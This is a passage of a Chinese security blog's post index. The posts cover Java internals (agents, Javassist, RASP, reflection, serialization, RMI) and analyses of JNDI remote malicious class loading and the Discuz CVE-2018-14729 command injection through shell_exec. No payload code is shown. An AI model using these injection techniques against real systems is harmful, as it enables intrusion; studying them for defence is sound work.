helper.loadClass(factoryName);尝试用当前的类加载器看是否能加载到Factory类，这里能加载到；如果不能加载到，则通过clas = helper.loadClass(factoryName, codebase);进行远程加载；[11] 分别跟进看一下，如果在本地能加载到，就直接获取Factory类对象；[12] 如果不能加载到，就使用URLClassLoader从指定地址远程动态加载；[13] 最后如果(clas != null)，就实例化加载到的类，而这里加载到的类就是CalcCmd，实例化后即可执行类里面的代码。[14] 调用栈如下：[15] JNDI+LDAP实现攻击示例代码和RMI差不多，先起一个LDAP服务； 模拟一个客户端： 同样需要放一个编译后的恶意class文件在可访问的网站上； 启动服务端后再启动客户端，命令执行成功； 参考链接："},{"title":"简述 Java Agent结合Javassit修改字节码","date":"2022-09-19T11:29:30.000Z","url":"/2022/09/19/%E7%AE%80%E8%BF%B0%20Java%20Agent%E7%BB%93%E5%90%88Javassit%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81/","categories":[[" ",""]],"content":"前言这是一篇只给我自己看的文章，想要了解标题内容，请直接访问文末链接；本文简要记录Java Agent结合Javassit修改字节码的过程，由于内容太多，人又太懒，就不详细记录了。 Java Agent概述javaagent是一种能够在不影响正常编译的情况下，修改字节码；Java作为一种强类型语言，不通过编译就不能够生成jar包，而有了javaagent技术，就可以在字节码层面对类和方法进行修改；同时也可以把javaagent理解成一种代码注入的方式。 javaagent就是一个jar包，但不能单独启动，必须依附在一个Java应用程序运行；可以使用Agent技术构建一个独立于应用程序的代理程序，用来协助监测、运行甚至替换其他JVM上的程序，可以使用它实现虚拟机级别的AOP功能。 Agent分为两种： 实现premain方法，主程序运行之前运行Agent； 实现agentmain方法，主程序运行之后运行Agent； 示例premain创建一个Maven取名为Java_Agent； 新建一个PreDemo类，并实现premain方法； 在src/main/resources/目录下创建META-INF/MANIFEST.MF文件，指定Premain-Class，要写你自己PerDemo类对应的全类名，最后必须多一个换行； 然后将该类打成jar包；操作：File -&gt; Project Structure -&gt; Artifacts -&gt; JAR -&gt; From modules with dependencies 然后按默认选择就可以了； 也可以选择下面的选项，设置路径到resource下，这样会自动生成META-INF/MANIFEST.MF文件，前面就不用自己创建了，但是自动生成后还需要自行添加Premain-Class； 打包好后再操作：Build -&gt; Build Artifacts -&gt; Build； 然后会生成一个out文件夹，下面就有我们打好的jar包； 再新建一个Hello项目，写一个Hello类进行测试； 按着什么同样的方法打成jar包，只不过这一步要把main函数所在的类选上； Build过后out文件夹下就生成了Hello.jar； 然后执行命令：java -javaagent:Java_Agent.jar -jar ../Hello_jar/Hello.jar注意两个jar包的路径要写对噢；可以看到，在执行main函数之前，先执行了premain； 使用这种方法的流程图： 这种方法的缺点是只能在JVM启动时使用javaagent参数指定jar包，在实际情况下，目标的JVM通常都是已经启动的状态，无法预先指定Premain-Class。 AgentMain和Premain差不多，需要在META-INF/MANIFEST.MF中指定一个Agent-Class： 这种方法不用在JVM启动前指定参数； 写一个AgentMain 打成jar包； 写一个AgentDemo，实现agentmain方法； 打成jar包； build过后out文件夹里面有这些： 这里我踩了一个坑，说我缺少com.sun.tools.attach依赖包，这个依赖包在tools.jar中，那么就手动将它加到模块中； 再另写一个测试类，以提供pid，其中sleep是为了防止进程过快结束； 运行Test，该进程正在等待中； 在任务管理器中找到该进程的pid，用下面的语句传入参数（注意路径）： 但是我这里又出现报错； 经过网上搜索查找原因，说是找不到attach.dll文件，按着网上的方法进行操作之后还是没有解决问题；按道理这样应该就没问题了，就先跳过这个问题吧。 agnetmain的缺点就是，如果在加入agentmain前，危险类就已经被加载了的话，就检测不出来；Java RASP多数是用premain。 JavassitJavassit就是用来修改字节码的，上一篇CC2里面大概讲了一下；当我们HOOK到目的类的时候，就可以获取该类中想要修改的方法，用insertBefore在该方法里面插入代码，或者直接用setBody全部替换掉该方法的内容。 示例该例子是用premain作为Agent程序的入口； 在pom.xml中添加javassit依赖包； 一个Hello类，有一个sayHello方法； 一个带有main方法的Test类，其中调用了Hello类的方法； PremainDemo类，实现了premain方法； 把Test和PremainDemo打成jar包，执行命令（注意路径）：java -javaagent:Premain_Test.jar -jar ../AgentMain_jar/AgentMain.jar执行后，会输出所有Test.jar运行过程中所加载的类，并且是先输出类，再输出this is mian!，充分说明了agent是在main函数运行之前运行；接着再是调用了sayHello方法； 接下来我们要加入javassit，修改sayHello方法的内容；在transform中添加hookHello类的代码，注意上面看到加载的类名是用/分割的； rebuild后，执行上面一样的命令； 在调用sayHello方法前，进入javaagent，hook到Hello类，修改了sayHello的字节码，先执行我们添加的代码，再执行sayHello方法； 关于Java RASPRASP是Runtime application self-protection的缩写，中文翻译为应用程序运行时防护，其与WAF等传统安全防护措施的主要区别于其防护层级更加底层——在功能调用前或调用时能获取访问到当前方法的参数等信息，根据这些信息来判定是否安全。 简单说就是WAF是在参数传入时进行检测防御，然而将参数进行一定的编码等方式就可以绕过WAF检测；RASP则是在传入参数执行时进行检测防御，不管前面对参数进行了怎样的编码，在实现功能前都会还原，所以能防御掉更多的攻击方法，当然，人外有人，还是有可以绕过的方法。 这里不详细说RASP，大概描述一下RASP的防御机制；差不多也是一个修改字节码的过程； Test类中是命令执行的代码，直接运行就弹出计算器； Test类在运行的时候加载几个跟命令执行有关的类； 在agent中以hookjava/lang/ProcessBuilder类为例，调用的是start方法，使用javassit在Test类main方法执行前添加return null的代码，这样后面命令执行的代码就不会执行了；修改一下PremainDemo类； 打成jar包，依然执行这条命令：java -javaagent:Premain_Test.jar -jar ../AgentMain_jar/AgentMain.jar成功拦截到命令执行代码； 总结就是，加入javaagent后，正常程序在执行前会先执行-javaagent参数对应jar包中的premain方法，premain对加载类进行一定检测，判断是否加载了危险类，对危险类进行拦截。 上面仅仅是我对RASP的一个理解，还有很多涉及到底层的东西需要好好研究，以后有机会再说叭。 后记如果你无聊的看完了，你肯定什么也没看懂，哈哈哈；我太懒了，将个就。看下面的链接讲得很详细喔。 参考链接："},{"title":"Java 动态代理","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","categories":[[" ",""]],"content":"概述代理模式：代理模式是Java常用的一种结构型设计模式，给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。代理类主要负责为被代理类（真实对象）预处理消息、过滤消息，然后将消息传递给被代理类，之后还能对消息进行后置处理。代理类不实现具体服务，而是通过调用被代理类中的方法来完成服务，并将执行结果封装处理。 通过代理对象访问目标对象可以在实现目标对象的基础上，又在不改变目标对象方法的情况下，对方法进行增强，即扩展目标对象的功能。 根据字节码的创建时机来分类，可以分为静态代理和动态代理： 静态代理： 在程序运行前就已经存在代理类的字节码文件，代理类与被代理类的关系在运行前就确定了。 动态代理： 代理类是在程序运行期间由JVM根据反射等机制动态生成的，程序运行前并不存在代理类的字节码文件。 静态代理定义一个接口： 定义一个被代理类，即目标对象，实现这个接口及其抽象方法： 创建代理类，实现与目标对象相同的接口，引用代理对象，调用该对象的方法，还可添加其他功能： 测试类，通过代理对象调用方法，进而调用目标对象的方法，然后将结果返回： 程序运行结果：[1] 静态代理的缺点： 由于代理类需实现与目标对象相同的接口，当有多个需被代理的类时，只有两种方法： 只创建一个代理类，这个代理类同时实现多个接口及其抽象方法，但是会导致代理类过于庞大； 创建多个代理类，每个代理类对应一个被代理类，但是会长生过多代理类； 当接口需要增加、删除、修改方法时，被代理类和代理类的代码都要修改，代码量过大，不易维护。 JDK动态代理接口和被代理类不变，创建一个调用处理器ProxyHandler类，并实现InvocationHandler接口； invoke的三个参数： proxy：被代理的对象 method：调用的方法 args：方法中的参数 动态代理测试类： 程序运行结果：[2] 动态代理实现步骤： 通过实现 InvocationHandler 接口创建自己的调用处理器； 通过为 Proxy 类指定 ClassLoader 对象和一组 interface 来创建动态代理类； 通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型； 通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。 代理对象生成过程代理对象的生成使用了java.lang.reflect.Proxy类的newProxyInstance方法，看一下源码： 再看看生成代理类的getProxyClass0； 继续跟ProxyClassFactory， 生成代理类的字节码文件用到了generateProxyClass，跟进： 使用generateClassFile()方法生成代理类的字节码文件，跟进： 生成字节码文件后，调用defineClass0(loader, proxyName, proxyClassFile, 0, proxyClassFile.length);解析字节码文件，进而生成代理对象。 参考链接："},{"title":"Java RMI","date":"2022-09-19T11:28:30.000Z","url":"/2022/09/19/Java%20RMI/","categories":[[" ",""]],"content":"概述定义：RMI全称 **远程方法调用(Remote Method Invocation)**，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。Java RMI： 用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。 组成部分：RMI由三部分组成： RMI Registry：JDK提供的一个可独立运行的程序（bin目录下）； RMI Server：服务端程序，对外提供远程对象，代码在这里执行，将执行结果返回给客户端； RMI Client：客户端程序，想要调用远程对象的方法。 示例1. 定义远程接口首先定义一个远程接口，该接口要继承java.rmi.Remote接口，表明这个接口可以被远程调用；定义一个sayHello()方法供远程调用，这个方法必须抛出java.rmi.RemoteException异常； 在Java中，Remote接口用于标识其方法可从非本地虚拟机调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”中指定的那些方法是远程可用的。 2.定义远程接口实现类定义一个类来实现远程接口ServiceInterface，并且需要继承java.rmi.server.UnicastRemoteObject；实现类里面必须要定义一个显式构造函数，并且抛出java.rmi.RemoteException异常；实现sayHello()方法，可以添加一个@Override注解，避免出错； 远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为“存根”，而服务器端本身已存在的远程对象则称之为“骨架”。其实此时的存根是客户端的一个代理，用于与服务器端的通信，而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。 3. 服务端注册远程对象，向客户端提供远程对象服务； 远程对象是在远程服务上创建的，无法准确的知道远程服务器上的对象的名称，不过将远程对象注册到RMI Registry之后，客户端就可以通过RMI Registry请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了。 4. 客户端客户端向服务端请求远程对象服务； 从RMI Registry中请求stub，如果RMI Registry在本地机器上，url就是rmi://localhost:port/绑定名，如果在远程机器上url就是rmi://RMI Service_IP:port/绑定名； 5. 远程方法调用过程首先启动RMIService，对指定端口进行监听；然后RMIService将自己提供的服务的实现类注册到RMIRegistry上，并指定一个访问路径；最后启动RMIClient，客户端通过本地接口和事先约定好的路径到RMIRegistry上去拿到实现类，所有的方法都在接口里，便可以任意调用远程对象的方法了。 调用结果如下：[1] 参考链接："},{"title":"Java 命令执行","date":"2022-09-19T11:27:30.000Z","url":"/2022/09/19/Java%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","categories":[[" ",""]],"content":"Runtime类测试代码 实现过程补充：Runtime类的exec的重载方法： public Process exec(String command) throwsIOException public Process exec(String command,String[] envp) public Process exec(String command,String[] envp, File dir) public Process exec(String cmdarray[])throws IOException 跟进一下getRuntime方法，该方法直接返回currentRuntime对象，而currentRuntime对象是上面Runtime的实例化对象；也就是说每次调用getRuntime()方法都会实例化一个Runtime对象。[1] 再跟一下exec方法，该方法又返回了一个exec方法；[2] 继续跟，该方法又返回了一个exec方法；[3] 继续跟，new了一个ProcessBuilder对象，调用了start方法；[4] 跟进start方法，该方法又执行了ProcessImpl类中的start静态方法；[5] 继续跟，后面new了一个ProcessImpl的对象；[6] 跟进ProcessImpl，444行创建了一个subprocess，也就是在这里，命令成功执行；[7] 调用流程： public Process exec(String command) public Process exec(String command, String[] envp, File dir) public Process exec(String[] cmdarray, String[] envp, File dir) ProcessBuilder.start() ProcessImpl.start() new ProcessImpl creat()最后返回的就是一个ProcessImpl对象。 反射调用Runtime如果不利用反射执行命令，当需要执行多个命令时，就显得很复杂繁琐，这时候就可以使用反射。 测试代码： 程序运行结果：[8] ProcessBuilder类从上面分析Runtime的实现流程可以知道，执行命令的过程中调用了ProcessBuilder的start方法，那么我们直接实例化ProcessBuilder的对象，调用start方法； 测试代码： [9] ProcessImpl类同样，上面两种类执行命令的过程中都调用了ProcessImpl类的start方法，但是该类是私有的，不能直接实例化，可以通过反射的方式调用； 测试代码： 程序运行结果：[10] 参考链接："},{"title":"Java序列化与反序列化","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","categories":[[" ",""]],"content":"概述什么是序列化和反序列化：Java 序列化：把Java对象转换为字节序列的过程；Java 反序列化：把字节序列还原为Java对象的过程； 对象序列化的两种用途： 把对象的字节序列永久的保存到硬盘上，通常放到一个文件中； 在网络上传输对象的字节序列； 当大量用户访问Web服务器时，就会创建大量Session对象，占据大量内存资源，于是Web服务器就会把一些Session对象序列化存放到硬盘中，需要使用的时候再将字节序列反序列化为对象到内存中；由于两个进程之间的通信时，数据是以二进制形式进行传输，所以发送方需要把Java对象序列化为字节序列，才能再网络上传输，接收方则把收到的字节序列反序列化为对象。 Java类库中的序列化相关APIjava.io.Serializable接口Java类通过实现java.io.Serializable接口来启用序列化功能。没有实现此接口的类无法使其任何状态序列化或反序列化；实现了该接口的可序列化类的所有子类型本身都是可序列化的；序列化接口没有方法或字段，仅用于标识可序列化的语义。 ObjectOutputStream类：序列化流作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为序列化，可实现对象的持久存储。特有成员方法：writeObject(Object obj)将指定的对象写入 ObjectOutputStream；writeObject 方法用于将对象写入流中。所有对象（包括 String 和数组）都可以通过 writeObject 写入。 ObjectInputStream类：反序列化流作用：将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象，称为反序列化。特有成员方法：Object readObject()从 ObjectInputStream 读取对象。 java.io.Externalizable接口 示例java.io.Serializable创建一个Person类，需要实现Serializable接口； transient关键字可以使被声明的变量不被序列化到文件中，当反序列化时，transient变量的值恢复为初始值，即int型是0，对象型是null； 创建一个SerializeDemo1类来实现序列化和反序列化； 程序运行结果如下，生成了per.txt，保存序列化后的数据：[1] java.io.ExternalizableJava还提供了另一个序列化接口java.io.Externalizable，下面来看看与java.io.Serializable的区别；将Person类改为实现java.io.Externalizable接口，该接口继承了java.io.Serializable接口，并且有两个抽象方法writeExternal()和readExternal()； 程序运行结果如下：[2] 反序列化后所有参数的值都恢复成了默认值，意味着对象的状态并没有被持久化下来；这就是Serializable接口与Externalizable接口的区别，通过Serializable接口对对象序列化的支持是内建于核心 API 的，但是java.io.Externalizable的所有实现者必须提供读取和写出的实现；也就是要实现writeExternal()和readExternal()方法； 实现两个抽象方法： 实现后，程序运行结果如下：[3] 静态变量的序列化示例代码：在Person类中添加一个静态变量： 在SerializeDemo1类中修改并输出静态变量，其他不变； 最后静态变量的输出结果是修改后的值18；[4] 按道理反序列化时读取的staticVar应该是序列化时保存的状态20才对，试验结果却不是这样；那是因为静态变量是属于类的状态，而序列化只保存对象的状态，所以序列化时并不保存静态变量，因此静态变量输出值为18； serialVersionUID即序列化版本号，是Java程序运行时环境根据类的内部细节自动生成的；该序列号在反序列化过程中用于验证序列化对象的发送者和接收者是否为该对象加载了与序列化兼容的类。如果接收者加载的该对象的类的 serialVersionUID 与对应的发送者的类的版本号不同，则反序列化将会导致 InvalidClassExceptio。如果对类的源代码进行了修改，再重新编译，新生成的类文件的serialVersionUID的取值有可能也会发生变化。类的serialVersionUID的默认值完全依赖于Java编译器的实现，对于同一个类，用不同的Java编译器编译，有可能会导致不同的 serialVersionUID，也有可能相同。为了提高serialVersionUID的独立性和确定性，强烈建议在一个可序列化类中显示的定义serialVersionUID，为它赋予明确的值。 小结 Java类只有实现Serializable接口或Externalizable接口才可启用序列化功能； 当一个对象被序列化时，只保存对象的非静态成员变量； 如果一个对象发成员变量是一个对象，那么这个对象的数据成员也会被序列化； 使用transient关键字声明不需要被序列化的变量； 如果父类实现序列化，那么子类就自动实现序列化，不需要再显式实现Serializable接口； 显式定义serialVersionUID。 参考链接："},{"title":"Java反射","date":"2022-09-19T11:26:30.000Z","url":"/2022/09/19/Java%E5%8F%8D%E5%B0%84/","categories":[[" ",""]],"content":"概述反射：框架设计的灵魂 框架：半成品软件；可以在框架的基础上进行软件开发，简化编码。 反射：将类的各个组成部分封装为其他对象。 下面大概介绍一下Java代码在计算机中经历的三个阶段： 第一阶段——Source源代码阶段：首先写一个类文件Person.java，类里面可以写一些成员变量、构造方法、成员方法等；经过javac编译后在硬盘上生成一个字节码文件Person.class，里面保存了成员变量、构造方法、成员方法等； 第二阶段——Class类对象阶段通过类加载器把字节码文件加载到内存里，内存中有一个Class 类对象（描述所有字节码文件的共同特征和行为），将成员变量封装为Field[ ]对象，构造方法封装为Constructor[ ]对象，成员方法封装为Method[ ]对象 第三阶段——Runtime运行时阶段new一个Person对象[1] 反射的好处： 可以在程序运行过程中，操作这些对象； 可以降低程序的一些耦合性，提高程序的可扩展性。 获取Class对象三种方式 Class.forName(&quot;全类名&quot;)：将字节码文件加载进内存，返回Class对象； 多用于配置文件，将类名定义在配置文件中；读取文件，加载类。 类名.class：通过类名的属性class获取； 多用于参数的传递。 对象.getClass()：getclass()方法在Object类中定义； 多用于对象的获取字节码的方式。 示例代码在cn.blckder02.domain下创建一个Person类，定义两个成员变量：[2] 再创建一个student类，作对比，暂时不用写内容；在cn.blckder02.reflect下创建一个ReflectDemo1类，分别用以上三种方法获取Class对象，代码如下： 程序运行结果如下，前两个比较都为true，说明同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象都是同一个；第三个比较为false，说明每个字节码文件对应的Class类对象都不相同。[3] 使用Class对象Class对象的获取功能 获取成员变量们 Field[ ] getFields() 获取所有public修饰的成员变量 Field getField(String name) 获取指定名称public的成员变量 Field[ ] getDeclaredFields() 获取所有成员变量，不考虑修饰符 Field getDeclaredField(String name) 获取所有指定名称的成员变量，不考虑修饰符 获取构造方法们 Constructor&lt;?&gt;[ ] getConstructors() 获取所有public修饰的构造方法 Constructor getConstructor(类&lt;?&gt;… parameterTypes) 获取指定名称public的构造方法 Constructor&lt;?&gt;[ ] getDeclaredConstructors() 获取所有构造方法，不考虑修饰符 Constructor getDeclaredConstructor(类&lt;?&gt;… parameterTypes) 获取所有指定名称的构造方法，不考虑修饰符 获取成员方法们 Method[ ] getMethods() 获取所有public修饰的成员方法 Method getMethod(String name, 类&lt;?&gt;… parameterTypes) 获取指定名称public的成员方法 Method[ ] getMethods() 获取所有成员方法，不考虑修饰符 Method getDeclaredMethod(String name, 类&lt;?&gt;… parameterTypes) 获取所有指定名称的成员方法，不考虑修饰符 获取类名 String getName() 示例1. 获取成员变量们在Person类中按如下属性添加a、b、c、d四个成员变量，并重新设置toString()方法； 获取成员变量后可做操作： 设置值：void set(Object obj, Object value) 获取值：get(Object obj) 忽略访问权限修饰符的安全检查：setAccessible(true)（暴力反射） 在cn.blckder02.reflect下创建ReflectDemo2类，代码如下： 由于getFields()只能获取public修饰的成员变量，所以第一个只输出a；而getDeclaredFields()能获取所有成员变量，所以输出每个成员变量；getDeclaredField(String name)不能直接访问私有成员变量，但是可以使用setAccessible()方法，忽略访问权限修饰符的安全检查来访问。程序运行结果如下：[4] 2. 获取构造方法们getConstructors()方法同样只能获取public修饰的构造方法。构造方法的名称都与类名相同，唯一的区别就是参数不同，所以在获取带参构造方法时要传入相应的参数。通过构造器来创建对象，需要用到newInstance()方法；如果使用空参构造方法创建对象，可以直接使用Class对象的newInstance()方法，简化代码，获取到的结果是一样的。同样可以通过暴力反射setAccessible()方法获取私有构造方法。 在cn.blckder02.reflect下创建ReflectDemo3类，代码如下： 程序运行结果如下：[5] 3. 获取成员方法们在person类中添加一个空参成员方法eat()，一个带参成员方法eat(String food)： 指定名称获取成员方法时，需要传入方法名以及参数。执行方法时，需要用到invoke()方法，要传入方法对象和实际的参数列表； 获取所有public修饰的成员方法时，不仅会得到自己设置的几个方法，还有Object类、父类等的方法。调用方法的getName()可以获取到方法名称。同样可以通过暴力反射setAccessible()方法获取私有成员方法。 在在cn.blckder02.reflect下创建ReflectDemo4类，代码如下： 程序运行结果如下：[6] 4. 获取类名调用类的getName()方法，获取到的是全类名；[7] 案例目的： 写一个类似“框架”的程序，在不改变程序任何代码的情况下，我们可以创建任意类对象，并执行其中方法。可以通过写配置文件和反射技术来实现；步骤： 将需要创建的对象的全类名和需要执行的方法定义在配置文件中 在程序中加载读取配置文件 使用反射技术来加载文件进内存 创建对象 执行方法 示例代码：配置文件config，类名参数值要写全类名： 测试程序ReflectTest.java： 程序运行结果：[8] 在不改动ReflectTest.java代码的情况下，修改配置文件，来调用student类中的sleep方法；[9] 此时程序运行结果：[10] 这就是框架的基本形式，只用修改少量地方，就能实现多种方法；而反射就是去获取我们看不见的构造器、对象、方法等。 参考链接："},{"title":"Java注解","date":"2022-09-19T11:25:30.000Z","url":"/2022/09/19/Java%E6%B3%A8%E8%A7%A3/","categories":[[" ",""]],"content":"概述什么是注解？跟注释一样吗？注解和注释可不一样，注释是用文字描述、解释程序，是给程序员看的，为了让程序员更快速的了解程序功能；而注解是一种代码级别的说明，用来说明程序，是给计算机看的，可理解为给程序贴上了一个标签。 百度百科是这样解释的： 注解，可以看作是对 一个 类&#x2F;方法 的一个扩展的模版，每个 类&#x2F;方法 按照注解类中的规则，来为 类&#x2F;方法 注解不同的参数，在用到的地方可以得到不同的 类&#x2F;方法 中注解的各种参数与值； 从JDK5开始，java增加了对元数据（描述数据属性的信息）的支持。其实说白就是代码里的特殊标志，这些标志可以在编译，类加载，运行时被读取，并执行相应的处理，以便于其他工具补充信息或者进行部署。 使用格式：@注解名称[(属性值)] 作用分类： 编写文档：通过代码里标识的元数据生成文档【生成文档doc文档】 代码分析：通过代码里标识的元数据对代码进行分析【使用反射】 编译检查：通过代码里标识的元数据让编译器能够实现基本的编译检查【Override】 这里简单演示一下生成文档：新建一个类，里面写一个add()方法，并且添加了一些文档注释，文档注释里面又使用了一些注解；这些注解可以被抽取到Javadoc文档中；[1] 将AnnoDemo1.java文件单独保存到一个文件夹中，在命令行中执行javadoc AnnoDemo1.java，就生成了许多html文档；[2] 打开index.html，里面就可以看到我们创建的类和方法的信息，包括我们写的文档注释和使用的注解。[3] 后面两种作用下面慢慢演示。 内置注解在java.lang包中，可理解为JDK中预定义的一些注解； 内置注解有以下五类：1. @Override检测被该注解标注的方法是否是继承自父类（接口）的，可以确保子类确实重写了父类的方法，避免出现低级错误； 添加一个toString()方法，这个方法使用了 @Override注解，那么就要检测这个toString()方法是否与Object类中的toString()方法相同；如果相同则没有报错；[4] 如果不同则报错说这个方法不是来自它的父类；[5] 2. @Deprecated表示该注解标注的内容已过时，但是仍然可以调用，只不过会出现删除线； 先写了一个show1()方法，没过多久，发现这个show1()方法有缺陷，于是又新写了一个show2()方法，从而给show1()方法添加了@Deprecated注解，表示不建议使用该方法了；如果非要使用show1()方法，就会出现删除线；那为什么不删除show1()方法呢？因为还会存在有用户使用低版本的环境，删掉就不兼容了。[6] 3. @SuppressWarnings取消被该注解标注的元素及其子元素编译器显示的警告（消除警告）； 没有添加注解前，会出现许多这样的警告；[7] @SuppressWarnings注解带有一个value属性，所以使用时要给value传值，一般写all，消除所有警告；[8] 一般把@SuppressWarnings添加到定义类的前面，这样该类的所有警告都会消失；[9] 4. “堆污染”警告与@SafeVarargs消除警告； 想理解这个就要明白什么是堆污染，堆污染是什么？就是把不带泛型的对象赋给一个带泛型的对象，为什么不行？因为不带泛型的话，默认会给泛型设定为object，意思就是什么类型都可以往里面塞，那你一个不带泛型的怎么可能给一个带泛型塞呢。 那什么是泛型呢？泛型，顾名思义就是广泛的数据类型，有多广泛，什么数据类型都行；像下面这段代码，在类名后面声明泛型T，那么其中的成员变量、成员方法就可以使用泛型来定义，可以给这个变量传入各种类型的值；[10] 注意：可变参数更容易引发堆污染异常，因为java不允许创建泛型数组，可变参数恰恰是数组。 下面这段代码method方法接受的是一个泛型为Integer类型的Set集合，而main方法中，将一个没有泛型的set对象传给method方法时，则可能造成堆污染，出现警告；[11] 抑制这个警告的方法有三个: @SafeVarargs修饰引发该警告的方法或构造器 使用@suppressWarnings(“unchecked”) 编译时使用-Xlint:varargs [12] 5. 函数式接口与@Functionallnterface用于检查我们写的接口是否与函数式接口定义时的相符合； 什么是函数式接口？一个接口，这个接口里面只能有一个抽象方法； 定义一个接口，里面定义一个抽象方法，用@FunctionalInterface注解，没有报错；[13] 如果在里面定义两个抽象方法，就会出现报错。[14] 元注解在java.lang.annotation包下，可以标注注解的一些注解； 元注解有以下五种：1. @Retention当它标注到一个注解上时，它的属性就是该注解的存活时间； @Retention有一个属性，有以下三种取值： RetentionPolicy.SOURCE：注解只在源码阶段保留，在编译器进行编译时它将被丢弃忽视； RetentionPolicy.CLASS：注解只被保留到编译进行的时候，它并不会被加载到 JVM 中； RetentionPolicy.RUNTIME：注解可以保留到程序运行的时候，它会被加载进入到 JVM 中，所以在程序运行时可以获取到它们。使用格式：@Retention(RetentionPolicy.SOURCE) 2. @Documented能够将被@Documented标注的类中的注解提取到Javadoc中去。 3. @Target指定被标注的注解运用的地方； @Target有一个属性，有以下几种取值，可选用多个值，用逗号隔开： ElementType.ANNOTATION_TYPE 可以给一个注解进行注解 ElementType.CONSTRUCTOR 可以给构造方法进行注解 ElementType.FIELD 可以给属性进行注解 ElementType.LOCAL_VARIABLE 可以给局部变量进行注解 ElementType.METHOD 可以给方法进行注解 ElementType.PACKAGE 可以给一个包进行注解 ElementType.PARAMETER 可以给一个方法内的参数进行注解 ElementType.TYPE 可以给一个类型进行注解，比如类、接口、枚举使用格式：@Target(ElementType.TYPE,ElementType.PACKAGE) 4. @Inherited如果一个A方法被@Inherited和其他一些注解所标注，B方法继承了A方法，且B方法没有被任何注解标注，那么B方法就自动继承标注A方法的所有注解。 5. @Repeatable先看个例子来： 上面的代码中先定义了一个Persons注解，然后定义了一个Person注解，并且用@Repeatable来注解这个注解，而@Repeatable后面的括号相当于一个容器注解，可以理解为存放其他注解的地方，即Persons，它本身也是一个注解；然后用@Person注解去标注Man方法，可以给@Person注解中的role属性赋值，Man方法在拥有@Person注解的属性的同时，也拥有@Persons注解的属性。 注解的属性注解的属性就相当于接口的抽象方法； 定义一个注解@Person： 当只有一个属性name的时候，使用时可以不带属性名称： 有多个属性时，使用时就必须写明属性名称及值，多个属性之间用逗号隔开： 也可以将属性用default关键字指定为默认值，使用时可写为@Person()： 没有属性时就只用写@Person。 属性的返回类型可以是： 八种基本类型 String类型 Class类型 注解类型 枚举类型 以上五种类型的数组类型 自定义注解看了前面那么多例子，差不多也知道注解该怎么写了；格式： 注解本质上就是一个接口，默认继承java.lang.annotation.Annotation；Annotation是所有注解类型扩展的公共接口，手动扩展这个接口不限定注解类型，且此接口本身不是注解类型。 使用注解使用注解的目的是获取注解中定义的属性值，而注解是通过反射获取的；以Java反射中的ReflectTest.java为例，注解可以用来替换1、2步配置文件的相关操作； 先自定义一个注解@Anno1： 写一个Demo1，定义一个show1方法： 再写一个Demo2，定义一个show2方法： 把ReflectTest.java搬过来，用注解替换配置文件部分的操作，然后通过反射获取类名和方法名，最后执行获取到的方法，代码如下： 程序运行结果：[15] 其中： 意思就是在内存中生成了一个该注解(本质是接口)的子类实现对象，可以理解为下面代码： Anno1Impl 实现了Anno1注解（接口），并且复写了Anno1中的两个方法，返回了使用Anno1注解时两个属性的值；anno.className()调用的className()方法就相当于是调用的Anno1Impl 中的className()方法；anno.methodName()同理。 通过修改使用注解时属性的值，便可以获取到不同的方法； [16] 案例写一个Check注解，用于检测被标注的方法是否出错： 写一个计算器，给每个计算方法前都加上@Check注解： 再写一个TestCheck测试程序，将出现的异常写到bug.txt中： 执行TestCheck.java，输出如下：[17] 只输出了sub和mul方法的计算结果，说明add和div方法出现了异常；查看生成的bug.txt，里面记录了异常信息：[18] 小结 注解是提供数据用来解释程序代码的，是给编译器、解析程序看的； 注解不是程序的一部分，无论添加与否都不影响程序的执行； 注解的提取需要借助于 Java 的反射技术，反射比较慢，所以注解使用时也需要谨慎计较时间成本。 参考链接："},{"title":"Discuz!任意代码执行漏洞  CVE-2018-14729","date":"2022-09-18T07:30:30.000Z","url":"/2022/09/18/Discuz!%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%20CVE-2018-14729/","categories":[[" ",""]],"content":"前言环境搭建我下的是2.5版本的，下载地址： 访问/upload自动跳转安装页面，安要求安装就行了；[1] 漏洞描述2018-8-27日，Github上公布了有关Discuz 1.5-2.5版本后台中数据库备份功能存在命令执行漏洞的细节。 CVE编号：CVE-2018-14729该漏洞需要登录后台，并且有数据库备份权限。 影响版本：Discuz 1.5-2.5 漏洞分析漏洞点位于：/upload/source/admincp/admincp_db.php，第265行； 使用了shell_exec函数，若函数内容内容可控，就可以实现任意命令执行；在这行代码中，$tablesstr参数是可控的，跟踪该参数，这里将$tables的内容循环拼接到$tablesstr；[2] 找到$tables参数是在哪里被赋值的；[3] 先是对$_GET获取的type进行判断，如果值等于custom，并且$_GET[&#39;setup&#39;]不为空，则判断$_GET[&#39;customtables&#39;]是否为空，不为空就获取customtables字段内容，将其写入common_setting表的skey&#x3D;custombackup的svalue字段，写入的过程中会将写入的内容做序列化存储；[4] 然后将获取到的customtables的内容赋给$tables；也就是说只要我们只要向customtables参数传入恶意代码，就能在shell_exec函数处得以执行。 利用链分析 